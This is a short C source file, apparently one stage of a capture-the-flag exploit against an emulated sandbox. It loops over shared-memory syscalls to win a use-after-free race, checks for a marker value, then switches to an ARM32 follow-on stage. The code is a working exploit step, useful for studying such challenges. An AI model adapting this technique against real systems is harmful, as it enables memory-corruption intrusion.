static __attribute__((always_inline)) unsigned long syscall3(unsigned long n, unsigned long a1, unsigned long a2,
                                                             unsigned long a3) {
    register unsigned long x0 __asm__ ("x0") = n;
    register unsigned long x1 __asm__ ("x1") = a1;
    register unsigned long x2 __asm__ ("x2") = a2;
    register unsigned long x3 __asm__ ("x3") = a3;
    unsigned long ret;
    __asm__ __volatile__ (
        "svc 0;"
        : "+r" (x0)
        : "r" (x1), "r" (x2), "r" (x3)
        : "memory"
    );
    ret = x0;
    return ret;
}


#include "shared.h"


void _start() {
    sys_bookmark();

    while (1) {
        sys_create_shared(UAF_SZ);
        sys_map_shared(UAF_VA, UAF_SZ, 0);
        sys_pause();
        if (UAF_CHUNK->data[4] == UAF_MARKER_VAL) {
            // u_puts("pid0: UAF chunk found");
            break;
        }
        // u_puts("pid0: sys_rewind");// this is likely to make race less likely
        sys_rewind();
    }

    // u_puts("pid0: switching to arm32 stage");
    sys_unmap_shared();

    sys_switch(UC_ARCH_ARM, UC_MODE_ARM, CODE_VA_PID0_STAGE1);

    // u_puts("pid0: finished. should not reach here");
    while (1) {
    }
}
